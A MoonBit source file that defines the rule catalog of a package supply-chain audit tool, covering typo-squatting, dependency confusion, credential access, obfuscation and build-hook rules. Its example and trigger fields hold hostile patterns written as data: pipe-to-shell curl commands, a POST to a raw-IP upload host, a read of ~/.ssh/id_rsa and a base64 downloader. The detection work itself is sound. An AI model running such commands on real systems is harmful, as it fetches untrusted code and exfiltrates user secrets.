///|
/// 规则目录：每条检测规则的结构化文档。
/// 供 `mooncake-audit rules` 子命令与 SARIF 规则元数据复用；
/// 也是引擎自描述（声明核心功能可验证）的一部分。

///|
pub(all) struct RuleDoc {
  id : String
  title : String
  category : String // "metadata" | "source" | "combo"
  default_severity : String
  triggers : String
  example : String
  mitigation : String
} derive(Debug)

///|
/// 全部规则的目录（与引擎实现一一对应）
pub fn rules_catalog() -> Array[RuleDoc] {
  [
    {
      id: "M01",
      title: "Typo-squatting of popular module names",
      category: "metadata",
      default_severity: "High",
      triggers: "repo name within Damerau-Levenshtein distance 2 of a hotlist entry (distance 1 for names shorter than 8), different name, different author",
      example: "evil/asynk vs hotlist moonbitlang/async",
      mitigation: "publish under your own namespace and rename derivatives clearly",
    },
    {
      id: "M02",
      title: "Official namespace impersonation",
      category: "metadata",
      default_severity: "Critical",
      triggers: "repo name in the official moonbitlang set (core/async/parser/...) while the author is not moonbitlang, or an author name within DL<=2 of \"moonbitlang\"",
      example: "evil/core; author moonbitlangs",
      mitigation: "reserve official names at the registry; reject conflicting ownership",
    },
    {
      id: "M03",
      title: "Empty-shell module",
      category: "metadata",
      default_severity: "Medium",
      triggers: "no substantial readme and no tests",
      example: "auto-generated placeholder module",
      mitigation: "require a meaningful readme before publishing",
    },
    {
      id: "M04",
      title: "Repository owner mismatch",
      category: "metadata",
      default_severity: "Medium",
      triggers: "repository URL owner segment differs from the module author (case-insensitive); empty repository is Low",
      example: "author a, repository github.com/b/pkg",
      mitigation: "keep the manifest repository in sync with the publishing account",
    },
    {
      id: "M05",
      title: "Dependency confusion",
      category: "metadata",
      default_severity: "High",
      triggers: "a dependency repo name close to a hotlist/official name (DL<=2 for >=8 chars, DL<=1 for 5-7 chars), excluding self-owned dependencies",
      example: "dep stranger/moonbitl1 near popular/moonbitls",
      mitigation: "pin exact dependencies and review unfamiliar near-name deps",
    },
    {
      id: "M06",
      title: "Manifest name mismatch",
      category: "metadata",
      default_severity: "High",
      triggers: "manifest name differs from the registry authoritative name",
      example: "registry evil/asynx declares name moonbitlang/async",
      mitigation: "validate declared name against registry records at publish time",
    },
    {
      id: "S01",
      title: "Network exfiltration surface",
      category: "source",
      default_severity: "High",
      triggers: "raw-IP URLs or POST to hardcoded uncommon hosts; plain http client usage is Low",
      example: "http://13.37.13.37/upload",
      mitigation: "route all networking through documented, configurable endpoints",
    },
    {
      id: "S02",
      title: "Credential access",
      category: "source",
      default_severity: "High",
      triggers: "reads of SSH keys, .aws, .npmrc, browser credential stores; bare keyword mentions are lower severity",
      example: "read ~/.ssh/id_rsa",
      mitigation: "never touch user credential paths from library code",
    },
    {
      id: "S03",
      title: "Process execution",
      category: "source",
      default_severity: "Medium",
      triggers: "system/exec/spawn of shell commands; escalates with obfuscation",
      example: "system(\"curl ... | sh\")",
      mitigation: "avoid spawning shells; declare required tools explicitly",
    },
    {
      id: "S04",
      title: "Obfuscation and encoded payloads",
      category: "source",
      default_severity: "High",
      triggers: "base64 blobs >80 chars with decode context; hex runs >=64; decoded payload containing urls/shell/downloaders escalates to Critical",
      example: "from_base64(\"Y3VybCBodHRw...\") -> downloader",
      mitigation: "keep payloads readable; ship data files instead of encoded strings",
    },
    {
      id: "S05",
      title: "Foreign function surface",
      category: "source",
      default_severity: "Medium",
      triggers: "extern \"C\" declarations; dlopen/system/popen escalate to Critical",
      example: "extern \"C\" fn dlopen(...)",
      mitigation: "document every native binding and its provenance",
    },
    {
      id: "S06",
      title: "Pre-build hook command chains",
      category: "source",
      default_severity: "High",
      triggers: "pre-build hooks exist (baseline High); pipe-to-shell, command substitution, base64-decode-exec or reverse-shell indicators escalate to Critical",
      example: "pre-build command: curl http://x | sh",
      mitigation: "avoid network and shells in build hooks entirely",
    },
    {
      id: "S07",
      title: "Environment sniffing",
      category: "source",
      default_severity: "Medium",
      triggers: "distinct sensitive env keys (KEY/TOKEN/SECRET/PASS) >=2 in one file (>=4 -> High)",
      example: "reading CI_TOKEN + DEPLOY_SECRET",
      mitigation: "request only the env variables you document",
    },
    {
      id: "S08",
      title: "Suspicious write targets",
      category: "source",
      default_severity: "Medium",
      triggers: "writes to shell rc files, cron, systemd, startup paths, same-line credential read + write",
      example: "append to ~/.bashrc",
      mitigation: "confine writes to the package cache and documented paths",
    },
    {
      id: "S10",
      title: "Dropped artifacts",
      category: "source",
      default_severity: "High",
      triggers: "embedded platform binaries (ELF/PE/Mach-O magic) in the package; nested archives; executable scripts with shebangs",
      example: "bin/drop containing an ELF executable",
      mitigation: "ship source, not prebuilt binaries; document any bundled assets",
    },
    {
      id: "S99",
      title: "Exfiltration combo",
      category: "combo",
      default_severity: "Critical",
      triggers: "S01 (network, High+) and S02/S04 (credentials/obfuscation, High+) in the same production file; test files excluded",
      example: "read key + POST http://13.37.13.37 in one file",
      mitigation: "split is not a fix; remove the capability",
    },
  ]
}

///|
/// 按 id 查找规则文档
pub fn rule_by_id(id : String) -> RuleDoc? {
  let out : RuleDoc? = None
  for r in rules_catalog() {
    if r.id == id {
      return Some(r)
    }
  }
  out
}

///|
/// 目录的稳定文本渲染（`rules` 子命令输出）
pub fn catalog_text() -> String {
  let sb = StringBuilder()
  sb <+ "mooncake-audit rule catalog (\{rules_catalog().length()} rules)\n"
  for r in rules_catalog() {
    sb <+ "\n[\{r.id}] \{r.title}\n"
    sb <+ "  category: \{r.category}  severity: \{r.default_severity}\n"
    sb <+ "  triggers: \{r.triggers}\n"
    sb <+ "  example: \{r.example}\n"
    sb <+ "  mitigation: \{r.mitigation}\n"
  }
  sb.to_string()
}
